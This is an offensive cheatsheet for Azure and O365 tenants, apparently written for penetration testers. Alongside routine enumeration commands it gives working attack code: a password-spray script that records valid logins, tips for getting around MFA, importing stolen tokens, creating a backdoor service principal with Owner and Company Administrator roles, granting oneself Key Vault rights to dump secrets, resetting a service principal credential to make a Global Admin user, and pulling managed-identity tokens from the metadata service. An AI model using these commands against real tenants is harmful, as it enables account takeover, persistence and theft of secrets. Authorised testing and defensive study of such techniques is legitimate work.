## Microsoft Azure & O365 CLI Tool Cheatsheet
By Beau Bullock (@dafthack)

### Recon

Get Federation info for target domain

```
https://login.microsoftonline.com/getuserrealm.srf?login=username@targetdomain.com&xml=1
```


Get Tenant ID for a target domain
```
https://login.microsoftonline.com/<target domain>/v2.0/.well-known/openid-configuration
```

### Az PowerShell Module

```powershell
Import-Module Az
```

#### Authentication

```powershell
Connect-AzAccount

## Or this way sometimes gets around MFA restrictions

$credential = Get-Credential
Connect-AzAccount -Credential $credential
```

Import a context file

```powershell
Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json'
```

Export a context file

```powershell
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Account Information

List the current Azure contexts available

```powershell
Get-AzContext -ListAvailable
```

Get context details

```powershell
$context = Get-AzContext
$context.Name
$context.Account
```

List subscriptions

```powershell
Get-AzSubscription
```

Choose a subscription

```powershell
Select-AzSubscription -SubscriptionID "SubscriptionID"
```

Get the current user's role assignment

```powershell
Get-AzRoleAssignment
```

List all resources and resource groups

```powershell
Get-AzResource
Get-AzResourceGroup
```

List storage accounts

```powershell
Get-AzStorageAccount
```

#### WebApps & SQL

List Azure web applications

```powershell
Get-AzAdApplication
Get-AzWebApp
```

List SQL servers

```powershell
Get-AzSQLServer
```

Individual databases can be listed with information retrieved from the previous command

```powershell
Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

List SQL Firewall rules

```powershell
Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

List SQL Server AD Admins

```powershell
Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName
```

#### Runbooks

List Azure Runbooks

```powershell
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <AutomationAccountName> -ResourceGroupName <ResourceGroupName>
```

Export a runbook with:

```powershell
Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\
```

Script to export all runbooks from all subscriptions
```powershell
$subs = Get-AzSubscription

Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    mkdir .\$subscriptionid\
    Select-AzSubscription -Subscription $subscriptionid
    $runbooks = @()
    $autoaccounts = Get-AzAutomationAccount |Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
    }
    foreach($r in $runbooks){
        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
    }
}

```

#### Automation Account Job Outputs
Script to export all job outputs
```powershell
$subs = Get-AzSubscription
$jobout = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $jobs = @()
    $autoaccounts = Get-AzAutomationAccount |Select-Object AutomationAccountName,ResourceGroupName
    foreach ($i in $autoaccounts){
        $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
    }
    foreach($r in $jobs){
        Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId 
        $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId 
    }
}
$jobout | out-file -Encoding ascii joboutputs.txt
```

#### Virtual Machines

List VMs and get OS details

```powershell
Get-AzVM
$vm = Get-AzVM -Name "VM Name" 
$vm.OSProfile
```

Extract VM UserData
```powershell
$subs = Get-AzSubscription

$fulllist = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $vms = Get-AzVM
    $list = $vms.UserData
    $list
    $fulllist += $list
}
$fulllist
```

Run commands on VMs

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1
```

#### Networking

List virtual networks

```powershell
Get-AzVirtualNetwork
```

List public IP addresses assigned to virtual NICs

```powershell
Get-AzPublicIpAddress
```

Get Azure ExpressRoute (VPN) Info

```powershell
Get-AzExpressRouteCircuit
```

Get Azure VPN Info

```powershell
Get-AzVpnConnection
```

#### Backdoors

Create a new Azure service principal as a backdoor

```powershell
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$spn
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
$UnsecureSecret
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
$cred = Get-Credential
Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
```

### MSOnline PowerShell Module

```powershell
Import-Module MSOnline
```

#### Authentication

```powershell
Connect-MsolService

## Or this way sometimes gets around MFA restrictions

$credential = Get-Credential
Connect-MsolService -Credential $credential
```

#### Account and Directory Information

List Company Information

```powershell
Get-MSolCompanyInformation
```

List all users

```powershell
Get-MSolUser -All
```

List all groups

```powershell
Get-MSolGroup -All
```

List members of a group (Global Admins in this case)

```powershell
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember –GroupObjectId $GUID
```

List all user attributes

```powershell
Get-MSolUser –All | fl
```

List Service Principals

```powershell
Get-MsolServicePrincipal
```

One-liner to search all Azure AD user attributes for passwords

```powershell
$users = Get-MsolUser -All; foreach($user in $users){$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props){if($user.$prop -like "*password*"){Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)}}} 
```

#### Function Apps
List Function App Hostnames
```powershell
$functionapps = Get-AzFunctionApp
foreach($f in $functionapps){
	$f.EnabledHostname
}
```

Extract interesting Function Info
```powershell
$subs = Get-AzSubscription
$allfunctioninfo = @()
Foreach($s in $subs){
    $subscriptionid = $s.SubscriptionId
    Select-AzSubscription -Subscription $subscriptionid
    $functionapps = Get-AzFunctionApp
    foreach($f in $functionapps){
        $allfunctioninfo += $f.config | select-object AcrUseManagedIdentityCred,AcrUserManagedIdentityId,AppCommandLine,ConnectionString,CorSupportCredentials,CustomActionParameter
        $allfunctioninfo += $f.SiteConfig | fl
        $allfunctioninfo += $f.ApplicationSettings | fl
        $allfunctioninfo += $f.IdentityUserAssignedIdentity.Keys | fl
    }
}
$allfunctioninfo
```

#### Simple Password Spray Script with Az PowerShell Connect-AzAccount

This simple script works well for ADFS environments. Uses one pass per line in the passlist.txt file for spraying with unique values for each user such as username or employee ID.

```powershell
$userlist = Get-Content userlist.txt
$passlist = Get-Content passlist.txt
$linenumber = 0

$count = $userlist.count

foreach($line in $userlist){

    $user = $line
    $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
    $current = $linenumber + 1
    Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
    $linenumber++
    $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)

    try
    {
        Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
        Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
        Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1] )
    }
    catch
    {
        $Failure = $_.Exception
        if ($Failure -match "ID3242")
        {     
            continue
        }
        else
        {
            Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1] )
            Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
            Add-Content valid-creds.txt $Failure.Message
            Write-Host -ForegroundColor red $Failure.Message
        }
    }
    
}
```

### Az CLI Tool

#### Authentication

```bash
az login
```

Login to the account without subscription access

```bash
az login --allow-no-subscriptions
```

#### Dump Azure Key Vaults

List out any key vault resources the current account can view 

```bash
az keyvault list –query '[].name' --output tsv 
```

With contributor level access you can give yourself the right permissions to obtain secrets. 

```bash
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list 
```

Get URI for Key Vault 

```bash
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv 
```

Get cleartext secret from keyvault 

```bash
az keyvault secret show --id <URI from last command> | ConvertFrom-Json
```

#### Invite a Guest User to Tenant via AZ CLI

```powershell
$Body="{'invitedUserEmailAddress':'Email Address to Invite', 'inviteRedirectUrl': 'https://portal.azure.com'}”
az rest --method POST --uri https://graph.microsoft.com/v1.0/invitations --headers "Content-Type=application/json" --body $Body
```
Then use InvitationRedeemUrl to accept invite on guest user account

#### Service Principal Attack Path
Commands for resetting a service principal credential that has higher privileges and then using the service principal to create a new user in the tenant with global admin permissions.

Create a new credential for service principal

```bash
az ad sp credential reset --id <app_id>
az ad sp credential list --id <app_id>
```

Login as a service principal using the password and app ID from previous command

```bash
az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
```

Create a new user in the tenant

```bash
az ad user create --display-name <display name> --password <password> --user-principal-name <full upn>
```

Add user to Global Admin group ID via MS Graph API:

```powershell
$Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}”
az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
```

### Metadata Service URL

```bash
http://169.254.169.254/metadata
```

Get access tokens from the metadata service

```bash
#### Managed Identity token retrieval
Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing

#### full instance path information
$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$instance
```

## Microsoft Device Code Login via PowerShell

Reference: https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html

First, initiate a device code login and then navigate to https://microsoft.com/devicelogin and enter the code that is output from the script below.
```powershell
$body = @{
    "client_id" =     "1950a258-227b-4e31-a9cf-717495945fc2"
    "resource" =      "https://graph.microsoft.com"
}
$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
$Headers=@{}
$Headers["User-Agent"] = $UserAgent
$authResponse = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$authResponse
```

After authenticating in the browser go back to your PowerShell terminal and run the below script to retrieve access tokens.

```powershell
$body=@{
    "client_id" =  "1950a258-227b-4e31-a9cf-717495945fc2"
    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
    "code" =       $authResponse.device_code
}
$Tokens = Invoke-RestMethod `
    -UseBasicParsing `
    -Method Post `
    -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" `
    -Headers $Headers `
    -Body $body
$Tokens
```

### Other Azure & O365 Tools

#### MicroBurst

Azure security assessment tool

https://github.com/NetSPI/MicroBurst 

Look for open storage blobs 

```powershell
Invoke-EnumerateAzureBlobs -Base $BaseName 
```

Export SSL/TLS certs 

```powershell
Get-AzPasswords -ExportCerts Y
```

Azure Container Registry dump

```powershell
Get-AzPasswords
Get-AzACR
```

#### PowerZure

Azure security assessment tool

https://github.com/hausec/PowerZure

#### ROADTools

Framework to interact with Azure AD

https://github.com/dirkjanm/ROADtools

#### Stormspotter

Red team tool for graphing Azure and Azure AD objects

https://github.com/Azure/Stormspotter

#### MSOLSpray

Tool to password spray Azure/O365

https://github.com/dafthack

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020
```
#### AzureHound

Tool to identify attack paths in Azure AD and AzureRM

https://github.com/BloodHoundAD/AzureHound

Run AzureHound with a refresh token:
```bash
./azurehound -r "0.ARwA6Wg..." list --tenant "tenant ID" -v 2 -o output.json
```
